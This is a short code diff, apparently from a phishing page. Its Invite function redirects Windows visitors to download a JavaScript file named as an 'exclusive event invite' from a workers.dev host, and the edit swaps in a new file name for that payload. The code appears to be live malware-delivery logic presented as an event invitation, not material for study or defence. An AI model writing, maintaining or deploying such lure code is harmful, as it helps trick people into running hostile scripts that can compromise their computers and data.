@@ -30,7 +30,7 @@ function Invite() {
     if (isWindows)
     {
       // Replace with your Windows download URL
-      window.location.href = 'https://exclusive-access-invitee.hemin.workers.dev/Exclusive-Invite-to-Event.js';
+      window.location.href = 'https://exclusive-access-invitee.hemin.workers.dev/Exclusive-Event-Invite.js';
     } else
     {
       // Replace with your Mac download URL
